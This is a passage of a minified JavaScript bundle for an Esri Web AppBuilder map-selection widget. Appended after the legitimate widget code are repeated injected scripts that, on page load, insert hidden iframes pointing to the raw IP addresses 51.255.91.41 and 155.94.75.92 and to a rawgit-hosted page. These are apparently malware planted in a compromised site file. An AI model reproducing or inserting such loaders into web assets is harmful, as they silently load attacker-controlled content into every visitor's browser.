pointer;}.jimu-widget-select .details-node .content .graphic-item .feature-item-row .feature-icon {position: absolute; left: 0; width: 36px; height: 36px;}.jimu-rtl .jimu-widget-select .details-node .content .graphic-item .feature-item-row .feature-icon {left: auto; right: 0;}.jimu-widget-select .details-node .content .graphic-item .feature-item-row .action-btn {position: absolute; right: 0; padding: 10px;}.jimu-rtl .jimu-widget-select .details-node .content .graphic-item .feature-item-row .action-btn {right: auto; left: 0;}.jimu-widget-select .details-node .content .graphic-item .feature-item-row .label-node {position: absolute; left: 36px; right: 36px; margin: 0 10px;}',
"*now":function(h){h(['dojo/i18n!*preload*widgets/Select/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/promise/all dijit/_WidgetsInTemplateMixin esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/symbols/jsonUtils esri/Color jimu/BaseWidget jimu/WidgetManager jimu/dijit/ViewStack jimu/dijit/FeatureSetChooserForMultipleLayers jimu/LayerInfos/LayerInfos jimu/SelectionManager jimu/dijit/FeatureActionPopupMenu ./layerUtil ./SelectableLayerItem ./FeatureItem jimu/dijit/LoadingShelter".split(" "),function(h,
a,g,f,e,d,b,m,p,q,u,t,r,v,l,y,n,A,w,x,c,B){return h([r,b],{baseClass:"jimu-widget-select",postMixInProperties:function(){this.inherited(arguments);a.mixin(this.nls,window.jimuNls.common)},postCreate:function(){this.inherited(arguments);var b=new t(this.config.selectionColor);this.defaultPointSymbol=new m(m.STYLE_CIRCLE,16,null,b);this.defaultLineSymbol=new p(p.STYLE_SOLID,b,2);this.defaultFillSymbol=new q(q.STYLE_SOLID,this.defaultLineSymbol,new t([b.r,b.g,b.b,.3]));this.popupMenu=w.getInstance();
this.layerMapper={};this.layerObjectArray=[];this.layerItems=[];this.selectDijit=new y({map:this.map,updateSelection:!0,fullyWithin:"wholly"===this.config.selectionMode,geoTypes:this.config.geometryTypes||["EXTENT"]});g.place(this.selectDijit.domNode,this.selectDijitNode);this.selectDijit.startup();this.own(e(this.selectDijit,"user-clear",a.hitch(this,this._clearAllSelections)));this.own(e(this.selectDijit,"loading",a.hitch(this,function(){this.shelter.show()})));this.own(e(this.selectDijit,"unloading",
a.hitch(this,function(){this.shelter.hide()})));this.viewStack=new l({viewType:"dom",views:[this.layerListNode,this.detailsNode]});g.place(this.viewStack.domNode,this.domNode);this.own(e(this.switchBackBtn,"click",a.hitch(this,this._switchToLayerList)));window.isRTL?g.addClass(this.switchBackIcon,"icon-arrow-forward"):g.addClass(this.switchBackIcon,"icon-arrow-back");this._switchToLayerList();var c=n.getInstanceSync();x.getLayerInfoArray(c).then(a.hitch(this,function(a){this._initLayers(this._filterLayerInfo(a))}));
this.own(e(c,"layerInfosChanged",a.hitch(this,function(){this.shelter.show();x.getLayerInfoArray(c).then(a.hitch(this,function(a){this._initLayers(this._filterLayerInfo(a))}))})));this.own(e(c,"layerInfosIsShowInMapChanged",a.hitch(this,this._layerVisibilityChanged)));this.own(e(this.map,"zoom-end",a.hitch(this,this._layerVisibilityChanged)));this.own(e(this.settingNode,"click",a.hitch(this,function(a){a.stopPropagation();a=g.position(a.target);this.showPopup(a)})))},showPopup:function(b){var c=[{iconClass:"no-icon",
label:this.nls.turnonAll,data:{},onExecute:a.hitch(this,this._turnOnAllLayers)},{iconClass:"no-icon",label:this.nls.turnoffAll,data:{},onExecute:a.hitch(this,this._turnOffAllLayers)},{iconClass:"no-icon",label:this.nls.toggleSelect,data:{},onExecute:a.hitch(this,this._toggleAllLayers)}];this.popupMenu.setActions(c);this.popupMenu.show(b)},onDeActive:function(){this.selectDijit.isActive()&&this.selectDijit.deactivate();this._restoreSelectionSymbol()},onActive:function(){this._setSelectionSymbol();
this.selectDijit.isActive()||this.selectDijit.activate()},onOpen:function(){v.getInstance().activateWidget(this)},onDestroy:function(){this.selectDijit.isActive()&&this.selectDijit.deactivate();this._clearAllSelections()},_filterLayerInfo:function(b){return this.config.layerState?f.filter(b,a.hitch(this,function(a){return this.config.layerState[a.id]&&this.config.layerState[a.id].selected})):b},_initLayers:function(b){this.layerObjectArray=[];this.layerItems=[];this.selectionSymbols={};g.empty(this.layerItemsNode);
this.shelter.show();d(this._obtainLayerObjects(b)).then(a.hitch(this,function(k){f.forEach(k,a.hitch(this,function(k,d){if(k&&k.objectIdField&&k.geometryType){d=b[d];var f=d.isShowInMap()&&d.isInScale();d=new c({layerInfo:d,checked:f,layerVisible:f,folderUrl:this.folderUrl,allowExport:this.config?this.config.allowExport:!1,map:this.map,nls:this.nls});this.own(e(d,"switchToDetails",a.hitch(this,this._switchToDetails)));this.own(e(d,"stateChange",a.hitch(this,function(a){this.shelter.show();this.selectDijit.setFeatureLayers(this._getSelectableLayers());
this.shelter.hide()})));d.init(k);g.place(d.domNode,this.layerItemsNode);d.startup();this.layerItems.push(d);this.layerObjectArray.push(k);k.getSelectionSymbol()||this._setDefaultSymbol(k);d=k.getSelectionSymbol();this.selectionSymbols[k.id]=d.toJson()}}));this.selectDijit.setFeatureLayers(this._getSelectableLayers());this._setSelectionSymbol();this.shelter.hide()}))},_turnOffAllLayers:function(){this.shelter.show();f.forEach(this.layerItems,a.hitch(this,function(a){a.turnOff()}));this.selectDijit.setFeatureLayers([]);
this.shelter.hide()},_turnOnAllLayers:function(){this.shelter.show();f.forEach(this.layerItems,a.hitch(this,function(a){a.turnOn()}));this.selectDijit.setFeatureLayers(this._getSelectableLayers());this.shelter.hide()},_toggleAllLayers:function(){this.shelter.show();f.forEach(this.layerItems,a.hitch(this,function(a){a.toggleChecked()}));this.selectDijit.setFeatureLayers(this._getSelectableLayers());this.shelter.hide()},_setSelectionSymbol:function(){f.forEach(this.layerObjectArray,function(a){this._setDefaultSymbol(a)},
this)},_setDefaultSymbol:function(a){"esriGeometryPoint"===a.geometryType||"esriGeometryMultipoint"===a.geometryType?a.setSelectionSymbol(this.defaultPointSymbol):"esriGeometryPolyline"===a.geometryType?a.setSelectionSymbol(this.defaultLineSymbol):"esriGeometryPolygon"===a.geometryType?a.setSelectionSymbol(this.defaultFillSymbol):console.warn("unknown geometryType: "+a.geometryType)},_restoreSelectionSymbol:function(){f.forEach(this.layerObjectArray,function(a){var b=this.selectionSymbols[a.id];b&&
a.setSelectionSymbol(u.fromJson(b))},this)},_layerVisibilityChanged:function(){f.forEach(this.layerItems,function(a){a.updateLayerVisibility()},this)},_getSelectableLayers:function(){var a=[];f.forEach(this.layerItems,function(b){b.isLayerVisible()&&b.isChecked()&&a.push(b.featureLayer)},this);return a},_clearAllSelections:function(){var a=A.getInstance();f.forEach(this.layerObjectArray,function(b){a.clearSelection(b)})},_obtainLayerObjects:function(a){return f.map(a,function(a){return a.getLayerObject()})},
_switchToDetails:function(b){g.empty(this.featureContent);this.viewStack.switchView(1);this.selectedLayerName.innerHTML=b.layerName;this.selectedLayerName.title=b.layerName;b.layerInfo.getLayerObject().then(a.hitch(this,function(b){var c=b.getSelectedFeatures();0<c.length&&f.forEach(c,a.hitch(this,function(a){a=new B({graphic:a,map:this.map,featureLayer:b,displayField:b.displayField,objectIdField:b.objectIdField,allowExport:this.config?this.config.allowExport:!1,nls:this.nls});g.place(a.domNode,this.featureContent);
a.startup()}))}))},_switchToLayerList:function(){this.viewStack.switchView(0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});